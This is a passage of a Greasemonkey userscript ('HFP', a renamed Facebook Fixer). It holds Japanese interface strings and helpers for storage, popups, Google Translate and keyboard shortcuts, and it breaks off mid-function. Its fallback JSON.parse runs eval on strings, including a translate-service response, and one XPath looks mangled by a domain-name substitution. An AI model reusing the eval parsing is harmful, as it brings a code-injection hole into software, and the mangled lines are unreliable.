		'ConfAutoReadMore' : '「もっと見る」リンクを自動的にクリックする',
		'ConfBigAlbumPictures' : 'アルバムページにページ内の全ての画像の大きいバージョンを表示するリンクを追加する',
		'ConfBigAlbumPicturesBorder' : '大きいバージョンの画像の周りに枠線を追加する',
		'ConfBookmarks' : '上部メニューバーにブックマークサブメニューを追加する',
		'ConfBottomBarHoverOpacity' : 'マウスオーバー時',
		'ConfBottomBarOpacity' : '下部メニューバーの透明度',
		'ConfCalendarBirthDate' : 'イベントの詳細に誕生日を含める',
		'ConfCalendarFullName' : '誕生日のタイトルに（ファーストネームだけではなく）フルネームを使う',
		'ConfChatDifferentiate' : '連絡先のチャット可能と一時退席中を太字と斜体を使って区別する',
		'ConfChatHideIdle' : '一時退席中の連絡先を隠す',
		'ConfDelayPopupPics' : 'ポップアップ画像を表示する前に短いディレイを追加する',
		'ConfDelayPopupPicsTimeout' : 'ポップアップ画像を表示する前のディレイ（ミリ秒単位，デフォルトは500ミリ秒）: ',
		'ConfDownloadVideo' : '動画のページから動画をダウンロードするリンクを追加する（<a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV再生ソフト</a>が必要です）',
		'ConfDisableTheater' : '写真シアターを無効にする',
		'ConfErrorPageReload' : 'アプリケーションエラーのページは5秒後に自動更新する',
		'ConfExport' : '設定をエクスポートするには下のテキストをコピーしてファイルに保存してください．',
		'ConfExternalPopup' : '外部画像のフルサイズバージョンをポップアップする <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'HFPの言語',
		'ConfFacebookTimestamps' : '時刻をFacebook方式で表示する（例: "3時間前"）',
		'ConfFBFTimestamps' : 'Facebook方式の時刻の後にFFxier方式の時刻を追加する（例: "11:45"）',
		'ConfFBFTimestamps24' : 'HFP方式の時刻を24時間表示にする',
		'ConfFriendRequestCountInTitle' : 'ページタイトルに新着友達リクエストの数を表示する',
		'ConfGoogleApps' : 'Google AppsのGoogleカレンダーへのリンクを作成する',
		'ConfGoogleAppsDomain' : 'ドメイン名',
		'ConfGoogleCalendar' : '<a href="http://ja.wikipedia.org/wiki/Google%E3%82%AB%E3%83%AC%E3%83%B3%E3%83%80%E3%83%BC" target="_blank">Googleカレンダー</a>に誕生日とイベントを追加するリンクを追加する',
		'ConfGoogleLanguage' : '<a href="http://ja.wikipedia.org/wiki/Google%E7%BF%BB%E8%A8%B3" target="_blank">Google翻訳</a>の言語',
		'ConfHideApplicationStories' : 'アプリケーションの記事を隠す',
		'ConfHideEgos' : 'egoセクションを全て隠す（Facebookのおすすめをできるだけ隠します）',
		'ConfHideEventStories' : 'イベントの記事を隠す',
		'ConfHideFacebookCountInTitle' : 'Facebookの受信箱の新着メッセージ数のカウントを隠す',
		'ConfHideFriendStories' : '友達になりましたの記事を隠す',
		'ConfHideGroupStories' : 'グループの記事を隠す',
		'ConfHideHovercards' : 'Hovercard（名前をマウスオーバーした時に現れるポップアップ）を隠す',
		'ConfHideLikeStories' : 'いいね！の記事を隠す',
		'ConfHideLinkStories' : 'リンクの記事を隠す',
		'ConfHideNoteStories' : 'ノートの記事を隠す',
		'ConfHidePhotoStories' : '写真の記事を隠す',
		'ConfHidePlaceStories' : 'スポットの記事を隠す',
		'ConfHideProfilePicStories' : 'プロフィール写真を更新した友達の記事を隠す',
		'ConfHideRead' : '最新情報で閲覧済みの項目を隠す',
		'ConfHideRelationshipStories' : '交際ステータスの記事を隠す',
		'ConfHideStatusStories' : '近況の記事を隠す',
		'ConfHideVideoStories' : '動画の記事を隠す',
		'ConfHideWallStories' : 'ウォールの記事を隠す',
		'ConfHomeBeta' : 'Facebook Sneak Peekを表示する',
		'ConfHomeChat' : 'チャットを表示する',
		'ConfHomeChatNames' : 'チャットに名前を表示する',
		'ConfHomeEvents' : 'イベントを表示する',
		'ConfHomeFindFriends' : 'Facebookでつながろうを表示する',
		'ConfHomeLeftAlign' : 'ページの内容を左寄せにする',
		'ConfHomeLeftColumn' : '左カラムを表示する',
		'ConfHomeLeftColumnFixed' : '画面をスクロールしても左カラムを表示したままにする',
		'ConfHomeLink' : '上部メニューバーにホームへのリンクを表示する',
		'ConfHomeNavigation' : 'ナビゲートを表示する',
		'ConfHomePokes' : 'あいさつを表示する',
		'ConfHomeProfile' : 'プロフィールを表示する',
		'ConfHomeRecommendations' : 'おすすめを表示する（知り合いかも？，おすすめのファンページ等）',
		'ConfHomeRequests' : 'リクエストを表示する',
		'ConfHomeRightColumn' : '右カラムを表示する',
		'ConfHomeStretch' : 'ページの幅をウィンドウの幅に合わせる',
		'ConfHomeStretchMiddleColumn' : 'ページの中央カラムの幅を自動調整する',
		'ConfiCalendar' : '全ての誕生日に<a href="http://ja.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a>ファイルをダウンロードするリンクを追加する',
		'ConfImport' : '後から設定をインポートする際は，下のテキストを以前保存したテキストで上書きしてから「インポート」をクリックしてください．',
		'ConfInboxCountInTitle' : 'ページタイトルに受信箱の新着メッセージ数を表示する',
		'ConfLogoutLink' : '上部メニューバーにログアウトへのリンクを追加する',
		'ConfNotificationCountInTitle' : 'ページタイトルに新しいお知らせの数を表示する',
		'ConfNewTabSearch' : 'CTRL + Enterを押して検索した時に新しいタブ/ウィンドウで検索結果を開く',
		'ConfPageTitle' : '全てのページタイトルから「Facebook |」を削除する',
		'ConfPhotoPopup' : 'マウスオーバー時に写真の大きいバージョンをポップアップする',
		'ConfPopupAutoClose' : 'ポップアップ画像を自動的に閉じる',
		'ConfPopupSmartAutoClose' : 'ポップアップ画像をマウスオーバーしている間は自動的に閉じない',
		'ConfPopupPosition' : 'ポップアップ画像の位置',
		'ConfPopupWhileTagging' : 'タグ付けしている時でもポップアップ画像を表示する',
		'ConfProcessInterval' : 'ページを処理する間隔（ミリ秒単位，デフォルトは1000ミリ秒）: ',
		'ConfProfileLink' : '上部メニューバーにプロフィールへのリンクを表示する',
		'ConfProfilePicPopup' : 'マウスオーバー時にプロフィール画像の大きいバージョンをポップアップする',
		'ConfProtocolLinks' : 'プロフィールのメッセンジャーIDを会話するためのリンクに変える（Googleトーク，Windows Live等）',
		'ConfSectionAbout' : 'HFPについて',
		'ConfSectionAdvanced' : '詳細',
		'ConfSectionEvents' : '誕生日/イベント',
		'ConfSectionImportExport' : 'インポート/エクスポート',
		'ConfSectionFeeds' : 'フィード',
		'ConfSectionHomePage' : 'ホームページ',
		'ConfSectionLiveFeed' : 'ニュースフィード',
		'ConfSectionMenu' : 'メニュー/チャット',
		'ConfSectionOther' : 'その他のオプション',
		'ConfSectionPageTitle' : 'ページタイトル',
		'ConfSectionPictures' : '画像',
		'ConfSectionShortcuts' : 'キーボードショートカット',
		'ConfSecureLinks' : 'FacebookへのリンクでHTTPSのページを強制する',
		'ConfShortcutList' : '<b>キーボード ショートカット</b>（大文字と小文字で異なります）:<br /><br /><i>どのページでも可能:</i><br />&nbsp;<b>A</b> - アルバム/写真<br />&nbsp;<b>B</b> - 連絡先リスト（オンラインの友達）の切替え<br />&nbsp;<b>C</b> - HFP設定<br />&nbsp;<b>D</b> - 誕生日<br />&nbsp;<b>E</b> - イベント<br />&nbsp;<b>F</b> - 友達<br />&nbsp;<b>H</b> - ホーム<br />&nbsp;<b>I</b> - 受信箱<br />&nbsp;<b>K</b> - ブックマークに追加<br />&nbsp;<b>L</b> - ログアウトへのリンクを選択 （その後でEnterを押すとログアウトします）<br />&nbsp;<b>N</b> - お知らせ<br />&nbsp;<b>P</b> - プロフィール<br />&nbsp;<b>R</b> - リクエスト<br />&nbsp;<b>S</b> - 検索ボックスにジャンプ<br />&nbsp;<b>T</b> - 選択されたテキストを翻訳<br />&nbsp;<b>?</b> - HFPのデバッグ情報を表示<br />&nbsp;<b>&lt;escape&gt;</b> - HFPが作成したポップアップを閉じる<br /><br /><i>ホームで可能（フィルタ）</i>:<br />&nbsp;<b>a</b> - ページ<br />&nbsp;<b>f</b> - 最新情報<br />&nbsp;<b>g</b> - グループ<br />&nbsp;<b>l</b> - リンク<br />&nbsp;<b>n</b> - ニュースフィード<br />&nbsp;<b>p</b> - 写真<br />&nbsp;<b>s</b> / <b>u</b> - 近況アップデート<br />&nbsp;<b>t</b> - ノート<br />&nbsp;<b>v</b> - 動画<br /><br /><i>プロフィールで可能</i>:<br />&nbsp;<b>i</b> - 基本データ<br />&nbsp;<b>p</b> - 写真<br />&nbsp;<b>w</b> - ウォール<br />&nbsp;<b>x</b> - ボックス<br /><br /><i>ページ付け（前へ，次へ等）があるページで可能</i><br />&nbsp;<b>←</b> - 前へ<br />&nbsp;<b>→</b> - 次へ<br />&nbsp;<b>&lt;shift&gt; + ←</b> - 最初へ（可能な時のみ）<br />&nbsp;<b>&lt;shift&gt; + →</b> - 最後へ（可能な時のみ）<br /><br /><i>アルバム/写真の閲覧時:</i><br />&nbsp;<b>a</b> - 全てのサムネイルを読み込む（可能な時のみ）<br />&nbsp;<b>b</b> - 大きい画像を表示<br />&nbsp;<b>c</b> - コメントを表示<br />&nbsp;<b>k</b> - アルバムに戻る<br />&nbsp;<b>m</b> - （誰かと）あなたの写真<br /><br /><i>友達の写真やアップロード/タグ付けされた写真の閲覧時:</i><br />&nbsp;<b>a</b> / &nbsp;<b>r</b> - 友達のアルバム<br />&nbsp;<b>m</b> / &nbsp;<b>u</b> - 携帯アップロード<br />&nbsp;<b>o</b> - 私が写っている写真<br />&nbsp;<b>p</b> - マイアルバム<br />&nbsp;<b>t</b> / &nbsp;<b>f</b> - タグ付けされている友達',
		'ConfShortcuts' : 'キーボードショートカットを有効にする．',
		'ConfSign' : 'プロフィールに星座を表示する（誕生日が提供されている場合）',
		'ConfTopBarFixed' : '画面をスクロールしても上部メニューバーを常に表示し続ける',
		'ConfTopBarHoverOpacity' : 'マウスオーバー時',
		'ConfTopBarOpacity' : '上部メニューバーの透明度',
		'DownloadVideo' : '動画をダウンロード',
		'ExportICalendarFile' : 'iCalendarファイルをエクスポートする',
		'ExportICalendarFileWarning' : '（友達がたくさんいる場合は多少時間がかかります）',
		'FacebookFixerConflict' : 'Facebook FixerはHFPに名前が変更されました．<br /><br />名前が変わったために，ブラウザからFacebook Fixerを手動でアンインストールしないと2つのスクリプトが互いにコンフリクトしてしまいます．<br /><br />userscriptをアンインストールするやり方が分からない場合は，<a %s>ここをクリックしてください．（注: 英語）</a>',
		'fullAlbumLoaded' : 'アルバムが全て読み込まれました',
		'Import' : 'インポート',
		'ImportConfirm' : 'これらの設定をインポートしてよろしいですか？\n現在の設定は失われます',
		'ImportFailure' : '設定をインポート中にエラーが発生しました．',
		'ImportSuccess' : 'インポートが完了しました．ページを更新しますか？',
		'Left' : '左',
		'LoadingAllPhotos' : '全ての写真を読み込み中...',
		'loadingFullAlbum' : '全てのアルバムを読み込み中...',
		'LoadingPic' : '画像を読み込み中...',
		'LoadPhotosWarning' : '全ての写真を読み込むには時間がかかるかもしれません',
		'Months' : new Array('1月','2月','3月','4月','5月','6月','7月','8月','9月','10月','11月','12月'),
		'ProtocolSkype' : '%sさんをSkypeで呼び出す',
		'ProtocolMSN' : '%sさんとWindows Liveでチャットする',
		'ProtocolYahoo' : '%sさんとYahoo!メッセンジャーでチャットする',
		'ProtocolGoogle' : '%sさんとGoogleトークでチャットする',
		'ReloadErrorPage' : 'もう一度クリックするか5秒お待ちください',
		'Refresh' : '更新',
		'Remove' : '削除',
		'Right' : '右',
		'ShowBigPictures' : '大きい画像を表示',
		'Signs' : new Array('山羊座','水瓶座','魚座','牡羊座','牡牛座','双子座','蟹座','獅子座','乙女座','天秤座','蠍座','射手座'),
		'today' : '今日',
		'Translators' : '翻訳',
		'UpdateAvailable1' : 'HFPをアップデートできます．',
		'UpdateAvailable2' : '今すぐアップデートしますか？',
		'UpdateHomepage' : 'ホームページへ',
		'UpdateInstall' : '今すぐインストールする',
		'UpdateTomorrow' : 'また今度インストールする',
		'yearsOld' : '%s歳'
	}
	
}

//
// Get Elements
//
function $(q, root, single) {
	if (root && typeof root == 'string') {
		root = $(root, null, true);
		if (!root) { return null; }
	}
	root = root || document;
	if (q[0]=='#') { return root.getElementById(q.substr(1)); }
	else if (q[0]=='/' || (q[0]=='.' && q[1]=='/')) {
		if (single) { return document.evaluate(q, root, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; }
		return document.evaluate(q, root, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
	}
	else if (q[0]=='.') { return root.getElementsByClassName(q.substr(1)); }
	return root.getElementsByTagName(q);
}

//
// Greasemonkey functions / cross-browser stuff
//

// Figure out what type of storage should be used
var storage = 'none';
try {
	if (typeof GM_getValue === 'function' && typeof GM_setValue === 'function') {
		// Make sure greasemonkey's functions work cause some browsers lie. Yes Chrome/Chromium, I'm talking about you...
		GM_setValue('testkey', 'testvalue');
		if (GM_getValue('testkey', false) === 'testvalue') { storage='greasemonkey'; }
	}
} catch(x) {}
if (storage=='none' && typeof localStorage == 'object') { storage='localstorage'; }

//
// Implement JSON functions if they're not already defined - based on http://www.sitepoint.com/blogs/2009/08/19/javascript-json-serialization/
//
if (!this.JSON) {
	JSON = {};
	JSON.stringify = function (obj) {
		var t = typeof (obj);
		if (t != "object" || obj === null) {
			if (t == "string") obj = '"'+obj.replace(/"/g,'\\"')+'"';
			return String(obj);
		} else {
			var n, v, json = [], arr = (obj && obj.constructor == Array);
			for (n in obj) {
				v = obj[n]; t = typeof(v);
				if (t == "string") v = '"'+v.replace(/"/g,'\\"')+'"';
				else if (t == "object" && v !== null) v = JSON.stringify(v);
				json.push((arr ? "" : '"' + n + '":') + String(v));
			}
			return (arr ? "[" : "{") + String(json) + (arr ? "]" : "}");
		}
	};
	JSON.parse = function (str) {
		if (str === "") str = '""';
		eval("var p=" + str + ";");
		return p;
	};
}

function setValue(key, value) {
	prefs[key] = value;
	switch (storage) {
		case 'greasemonkey':
			GM_setValue(id+'-'+key, value);
			break;

		case 'localstorage':
			localStorage['fbf-'+id+'-'+key] = value;
			break;
	}
}

function getValue(key, value) {
	switch (storage) {
		case 'greasemonkey':
			return GM_getValue(id+'-'+key, value);

		case 'localstorage':
			var val = localStorage['fbf-'+id+'-'+key];
			if (val=='true') { return true; }
			else if (val=='false') { return false; }
			else if (val) { return val; }
			break;
	}
	return value;
}

function log(str) {
	if (typeof debug !== 'undefined') { debug(str); }
	if (typeof GM_log !== 'undefined') { GM_log(str); return true; }
	else if (typeof console !== 'undefined' && console.log) { console.log(str); return true; }
	return false;
}

function addStyle(css) {
	if (typeof GM_addStyle !== 'undefined') { return GM_addStyle(css); }
	else if (heads = document.getElementsByTagName('head')) {
		var style = document.createElement('style');
		try { style.innerHTML = css; }
		catch(x) { style.innerText = css; }
		style.type = 'text/css';
		heads[0].appendChild(style);
	}
}

function getStyle(elm, prop) {
	return window.getComputedStyle(elm, null).getPropertyValue(prop);
}

function registerMenuCommand(name, func) {
	if (typeof GM_registerMenuCommand !== 'undefined') { return GM_registerMenuCommand(name, func); }
}

function xmlhttpRequest(params, callBack) {
	if (typeof GM_xmlhttpRequest !== 'undefined') {
		params['onload'] = callBack;
		return GM_xmlhttpRequest(params);
	}
	return null;
}

function openInTab(url) {
	if (typeof GM_openInTab !== 'undefined') { GM_openInTab(url); }
	else { window.open(url); }
}

function row(cells) { return '<tr><td>' + cells.join('</td><td>') + '</td></tr>'; }


//
// Enable profile-specific settings
//
try {
	var profileLink = $("//ul[@id='pageNav']//li[contains(@class,'ruifujiwara.co.cc')]/a",null,true);
	if (m = profileLink.href.match(/id=(\d+)\b/)) { id = m[1]; }
	else if (m = profileLink.href.match(/\/([^\/]+)$/)) { id = m[1]; }
} catch(x) {}
//log('id = ' + id); // DEBUG ONLY
var buf  =	'ProfilePicPopup,PhotoPopup,ExternalPopup,!DelayPopupPics,PopupAutoClose,!PopupSmartAutoClose,!PopupWhileTagging,BigAlbumPictures,BigAlbumPicturesBorder,!AutoBigAlbumPictures,!AutoLoadFullAlbum,!AutoLoadTaggedPhotos,!DisableTheater,'+
			'Age,Sign,iCalendar,GoogleCalendar,CalendarFullName,CalendarBirthDate,!GoogleApps,'+
			'!HomeLeftAlign,!HomeStretch,!HomeStretchMiddleColumn,!HomeLeftColumnFixed,HomeLeftColumn,HomeRightColumn,HomeProfile,HomeNavigation,HomeChat,!HomeChatNames,HomePokes,HomeFindFriends,HomeEvents,HomeRequests,HomeRecommendations,!HomeMostRecent,'+
			'Bookmarks,HomeLink,ProfileLink,FindFriendsLink,LogoutLink,ChatDifferentiate,!ChatHideIdle,DownloadVideo,ErrorPageReload,PageTitle,HideFacebookCountInTitle,!FriendRequestCountInTitle,!NotificationCountInTitle,InboxCountInTitle,NewTabSearch,!SecureLinks,Updates,ProtocolLinks,!TopBarFixed,Shortcuts,!FacebookTimestamps,FBFTimestamps,FBFTimestamps24,!PageStretch,'+
			'!HideApplicationStories,!HideAskFriendStories,!HideEventStories,!HideFriendStories,!HideGroupStories,!HideLikeStories,!HideLinkStories,!HideNoteStories,!HidePhotoStories,!HidePlaceStories,!HideProfilePicStories,!HideRelationshipStories,!HideStatusStories,!HideVideoStories,!HideWallStories,!AutoReadMore,!HideEgos,!HideHovercards';
var booleanOptions = buf.split(',');
var prefs = {
	'FacebookHFPLanguage': getValue('FacebookHFPLanguage', 'auto'),
	'PopupPosition': getValue('PopupPosition', 'auto'),
	'GoogleAppsDomain': getValue('GoogleAppsDomain', ''),
	'TopBarOpacity': getValue('TopBarOpacity', '1.0'),
	'TopBarHoverOpacity': getValue('TopBarHoverOpacity', '1.0'),
	'BottomBarOpacity': getValue('BottomBarOpacity', '1.0'),
	'BottomBarHoverOpacity': getValue('BottomBarHoverOpacity', '1.0'),
	'GoogleLanguage': getValue('GoogleLanguage', 'en'),
	'ProcessInterval': getValue('ProcessInterval', '1000'),
	'DelayPopupPicsTimeout' : getValue('DelayPopupPicsTimeout', '500'),
	'BookmarkList' : getValue('BookmarkList', '[]'),
	'ApplicationWhitelist' : getValue('ApplicationWhitelist', '[]'),
	'CustomFeedModification' : getValue('CustomFeedModification', ''),
	'CustomCSS' : getValue('CustomCSS', '')
}
for (var i=0; i<booleanOptions.length; i++) {
	bool = true;
	if (booleanOptions[i].charAt(0)=='!') {
		booleanOptions[i] = booleanOptions[i].replace('!','');
		bool = false;
	}
	prefs[booleanOptions[i]] = getValue(booleanOptions[i], bool)
}
prefs['HideRead'] = false; // This is broken

//
// Adjust legacy prefs
//
prefs['PopupPosition'] = prefs['PopupPosition'].toLowerCase().replace(/^-/, ''); // The replace is to handle a bug in 2.1.4
setValue('PopupPosition', prefs['PopupPosition']);

//
// Figure out what language we should be using
//
buffer = document.body.className.match(/locale_([^ ]+)/i);
if (prefs['FacebookHFPLanguage'] == 'auto' && buffer) {
	language = buffer[1].toLowerCase();
	detectedLanguage = language;
	if (!lang[language]) {
		language = language.split('_')[0];
		if (!lang[language]) { language = 'en'; }
	}
} else {
	language = prefs['FacebookHFPLanguage'];
}
//log(language); // DEBUG ONLY

//
// Add div for showing big profile pics
//
var popupPicDiv = document.createElement('div');
popupPicDiv.id = 'ff-popup-pic-div';
popupPicDiv.className = 'fbfPopup ff-popup-pic-div-' + (prefs['PopupPosition']=='auto' ? 'left' : prefs['PopupPosition']);
popupPicDiv.innerHTML = '<div id="ff-popup-pic-close" title="' + $l('Close') + '">x</div><div id="ff-popup-pic-image"><span></span></div>';
try {
	document.body.insertBefore(popupPicDiv, document.body.lastChild.nextSibling);
	on('click', '#ff-popup-pic-close', function() { document.getElementById('ff-popup-pic-div').style.display='none'; });
} catch(x) {
	var fbppdivAdder = setInterval(function() {
		try {
			document.body.insertBefore(popupPicDiv, document.body.lastChild.nextSibling);
			on('click', '#ff-popup-pic-close', function() { document.getElementById('ff-popup-pic-div').style.display='none'; });
			if ($('#ff-popup-pic-div')) { clearInterval(fbppdivAdder); }
		} catch(x) {}
	}, 100);
}
// Listeners are added by the code for showing the popups

//
// Add div for popups and shadows
//
var popupDiv = document.createElement('div');
popupDiv.id = 'fbfPopupContainer';
popupDiv.className = 'fbfPopupContainer';
document.body.appendChild(popupDiv);
on('click', popupDiv, function(e) { if (e.target.id=='fbfPopupContainer') { hidePopup() } });
var shadowDiv = document.createElement('div');
shadowDiv.id = 'fbfShadow';
document.body.appendChild(shadowDiv);

//
// Misc. Short Functions
//

// Get a string in the current language, or default to english
function $l(key,text) {
	var string, l;
	if (lang[language][key]) { string = lang[language][key]; l = language; }
	else { string = lang['en'][key]; l = 'en'}
	if (text) { string = string.replace('%s', text); }
	return string;
}

// Pad with a 0
function $0(x) { return x<10 ? '0'+x : ''+x; }

// Add event listeners
function on(type, elm, func) {
	if (type instanceof Array) { for (var i=0; i<type.length; i++) { on(type[i], elm, func); } }
	else {
		if (elm instanceof Array) { for (var j=0; j<elm.length; j++) { on(type, elm[j], func); } }
		else { (typeof elm === 'string' ? $(elm) : elm).addEventListener(type, func, false); }
	}
}

// Add 'click' event listener
function onClick(elm, func) { (typeof elm === 'string' ? $('#'+elm) : elm).addEventListener('click', func, false); }

// Click on an element
function click(elm) {
	var evt = document.createEvent('MouseEvents');
	evt.initEvent('click', true, true);
	elm.dispatchEvent(evt);
}

// Click on an element selected using xpath
function clickX(path) {
	var elm = $(path, null, true);
	if (!elm) { return false; }
	click(elm);
	return true;
}

// Get an elements position
function getPosition(elm) {
	var x=0;
	var y=0;
	while (elm != null) {
		x += elm.offsetLeft;
		y += elm.offsetTop;
		elm = elm.offsetParent;
	}
	return Array(x,y);
}

// Determine if we're on the home page
function isHomePage() {
	return !!(page.match(/^((\?|home\.php).*)?$/));
}

// Log an error
function logError(category, x) {
	msg = "FBF Error (" + category + ") - " +  x.name + ' - ' + x.message + ' in file <' + x.fileName + '> on line ' + x.lineNumber + ' while viewing ' + page;
	log(msg);
}

// Show a popup div with a shadow background
function showPopup(content, onTop, fixedPosition) {
	$('#fbfPopupContainer').innerHTML = content;
	$('#fbfPopupContainer').style.position = fixedPosition ? 'fixed' : 'absolute';
	$('#fbfShadow').style.zIndex = '1000';
	$('#fbfPopupContainer').style.zIndex = '1001';
	$('#fbfShadow').style.display = 'block';
	$('#fbfPopupContainer').style.display = 'block';
	if (!fixedPosition) { window.scroll(0,0); }
}

// Show a popup dialog - similar to showPopup() but more automated
function showDialog(content, controls, opts) {
	if (!opts) { opts=''; }
	if (!controls) { controls=''; }
	if (!opts.match(/\bnocontrols\b/)) { content+= '<div style="border-top:1px solid #ccc; margin-top:10px; padding-top:10px; text-align:right;">' + controls + (opts.match(/\bnoclose\b/) ? '' : '<input type="button" value="' + $l('Close') + '" id="ff-popup-close" />') + '</div>'; }
	showPopup('<div class="fbfPopup" style="' + (opts.match(/\bsmall\b/) ? 'max-width:450px; margin:80px auto;' : 'max-width:700px; margin:30px auto;') + '">' + content + '</div>');
	if (!opts.match(/\b(noclose|nocontrols)\b/)) { onClick($('#ff-popup-close'), hidePopup); }
}

// Hide popups created with showPopup()
function hidePopup() {
	if ($('#fbfPopupContainer')) {
		$('#fbfPopupContainer').style.display = 'none';
		$('#fbfShadow').style.display = 'none';
	}
}

// Figure out the month from a string containing a date
function $m(str) {
	// Supports: English (UK+US), Spanish, French, German, Dutch, Italian, Portuguese (Brazil+Portugal), Swedish, Greek, Serbian, Bulgarian, Slovak, Czech
	str = str.toLowerCase();
	var months = new Array (/^(.*\s)?(jan(uar[iy]?)?|enero|janvier|gennaio|janeiro|ιανουαρίου|јануар|януари|januára|leden)(\s.*)?$/,
							/^(.*\s)?(feb(ruar[iy]?)?|febrero|février|febbraio|fevereiro|φεβρουαρίου|фебруар|февруари|februára|únor)(\s.*)?$/,
							/^(.*\s)?(mar(ch)?|marzo|mars|märz|maart|março|μαρτίου|март|marca|březen)(\s.*)?$/,
							/^(.*\s)?(apr(ile?)?|abril|avril|απριλίου|април|apríla|duben)(\s.*)?$/,
							/^(.*\s)?(ma(yo?|i|j)|mei|maggio|maio|μαΐου|мај|май|mája|květen)(\s.*)?$/,
							/^(.*\s)?(june?|junio?|juin|giugno|junho|ιουνίου|јун|юни|júna|červen)(\s.*)?$/,
							/^(.*\s)?(jul[iy]?|julio|juillet|luglio|julho|ιουλίου|јул|юли|júla|červenec)(\s.*)?$/,
							/^(.*\s)?(aug(ust(i|us)?)?|agosto|août|αυγούστου|август|augusta|srpen)(\s.*)?$/,
							/^(.*\s)?(sep(tember)?|septiembre|se[pt]tembre|setembro|σεπτεμβρίου|септембар|септември|septembra|září)(\s.*)?$/,
							/^(.*\s)?(o[ck]t(ober)?|oct[ou]bre|ottobre|outubro|οκτωβρίου|октобар|октомври|októbra|říjen)(\s.*)?$/,
							/^(.*\s)?(nov(ember)?|noviembre|novembre|novembro|νοεμβρίου|новембар|ноември|novembra|listopad)(\s.*)?$/,
							/^(.*\s)?(de[cz](ember)?|dici?embre|décembre|dezembro|δεκεμβρίου|децембар|декември|decembra|prosinec)(\s.*)?$/);
	for (var i=0; i<months.length; i++) {
		if (str.match(months[i])) { return i; }
	}
	return -1;
}

// Parse a date
function $d(str) {
	str = ' ' + str.toLowerCase() + ' ';
	var m;
	var date = new Date();
	if (str.indexOf('tomorrow')!=-1) { date = date.getNextDay(); }
	else if (str.indexOf('today')==-1) {
		var month = $m(str);
		if (month==-1) return null;
		date.setMonth(month);
		if (m = str.match(/\b(\d{4})\b/)) { date.setYear(m[1]); }
		if (m = str.match(/\s(\d\d?\.?)[\s,]/)) { if (m[1]<32) { date.setDate(m[1]); } }
	}
	if (m = str.match(/\b(\d\d?):(\d\d)( (a|p)m)?/i)) {
		date.setHours(m[4]=='p' ? m[1]-0+12 : m[1]);
		date.setMinutes(m[2]);
		date.setSeconds(0);
	}
	return date;
}


//
// Rotate an object
//
function rotate(elm) {
	degrees=((elm.getAttribute('data-ff-degrees') || 0) - 0 + 90 ) % 360;
	elm.setAttribute('data-ff-degrees', degrees);
	elm.style.margin = '25px 0';
	elm.style.transform = 'rotate(' + degrees + 'deg)';
	elm.style.MozTransform = 'rotate(' + degrees + 'deg)';
	elm.style.OTransform = 'rotate(' + degrees + 'deg)';
	elm.style.WebkitTransform = 'rotate(' + degrees + 'deg)';
}


//
// Google Translate functions
//
function handleTranslateRequest() { showPopup('<div class="fbfPopup" style="width:600px; margin:100px auto; padding:10px; "><b>Translating...</b> (press escape to close this popup)</div>', true, true); }
function handleTranslateResponse(r) {
	//window.alert(r.responseText);
	//window.alert(r.responseText.match(/^\[(\[.*?\]\])/)[1]);
	//t = JSON.parse(r.responseText.replace('],,"', '],"","'));
	t = JSON.parse(r.responseText.match(/^\[(\[.*?\]\])/)[1]);
	translated = Array();
	for (var i=0; i<t.length; i++) { translated.push(t[i][0]); }
	showPopup('<div class="fbfPopup" style="width:600px; margin:100px auto; padding:10px; "><b>Translated Text via Google Translate</b> (automatically translated to ' + prefs['GoogleLanguage'] + '):<br /><br />' + translated.join(' ') + '<div style="text-align:right;"><input id="fbfCloseTranslation" type="button" value="' + $l('Close') + '" /></div></div>', true, true);
	onClick('fbfCloseTranslation', function() { hidePopup(); });
}
function googleTranslate(str) {
	if (typeof GM_xmlhttpRequest !== 'undefined') {
		handleTranslateRequest();
		xmlhttpRequest({method: "GET", url: "http://translate.google.com/translate_a/t?client=t&text=" + window.getSelection() + "&sl=auto&tl=" + prefs['GoogleLanguage']}, handleTranslateResponse);
	} else {
		window.open('http://translate.google.com/?sl=auto&tl=' + prefs['GoogleLanguage'] + '&text=' + window.getSelection());
	}
}


//
// Detect Facebook Fixer
//
if (id!=0) {
	setTimeout(function() {
		if ($('#FBPPdiv') && (true || parseInt(getValue("LastConflictCheck", "0")) + 86400000 <= (new Date().getTime()))) {
			setValue('LastConflictCheck', new Date().getTime() + "");
			showDialog('<div class="fbfImportant">HFP</div><br />' + $l('FacebookFixerConflict', 'href="http://www.ruifujiwara.co.cc" target="_blank"'), '', 'small');
		}
	}, 2000);
}


//
// Debug Info
//
function showDebugInfo() {
	try {
		showDialog(
			'HFP Debug Info:<br /><br />'+
			'<table id="ff-debug">'+
			row(['version: ',version])+
			row(['release date: ',release_date])+
			row(['release timestamp: ',version_timestamp])+
			row(['id: ',id])+
			row(['page: ',page])+
			row(['homepage: ',(isHomePage()?'yes':'no')])+
			row(['language: ',language])+
			row(['detected language: ',detectedLanguage])+
			row(['storage: ',storage])+
			row(['date: ',new Date()])+
			row(['user agent: ',navigator.userAgent])+
			'</table>'
		);
	} catch(x) { logError('Debug Info', x); }
}


//
// Keyboard shortcuts
//
if (prefs['Shortcuts']) {
	window.addEventListener('keydown', function(e) {
		//log(String.fromCharCode(e.keyCode) + ' - ' + e.keyCode + ' - ' + e.shiftKey + ' - ' + e.ctrlKey + ' - ' + e.altKey + ' - ' + e.metaKey); // DEBUG ONLY
		if ((e.target.type && e.target.type!='checkbox' && e.target.type!='select') || (e.target.getAttribute('contenteditable')=='true') || e.ctrlKey || e.altKey || e.metaKey) { return; }
		function clickLink(filter, root) {
			var link;
			if (!root) { root = document; }
			if (filter.charAt(0) == ':') { return clickX("//a[contains(@href,'" + filter.replace(/^./,'') + "')]"); }
			return clickX("//a[contains(string(),'"+filter+"')]");
		}
		function gotoPage(url, preventClick) {
			url = url.replace(/^https?:\/\/www\.facebook\.com/, '');
			if (unsafeWindow && unsafeWindow.Quickling) {
				if (location.href.toLowerCase().match(/^https?:\/\/www\.facebook\.com\//)) { location.hash = '!'+url; }
				else if (preventClick || !clickLink(':' + url)) { location.href = location.protocol + '//www.facebook.com' + url; }
			} else { location.href = location.protocol + '//www.facebook.com' + url; }
		}
		function gotoPageX(path) {
			var xElm = $(path,null,true);
			if (xElm) { gotoPage(xElm.href, true); }
			//else { log('"' + path + '" could not be resolved'); } // debug
		}
		if (e.keyCode==27) {
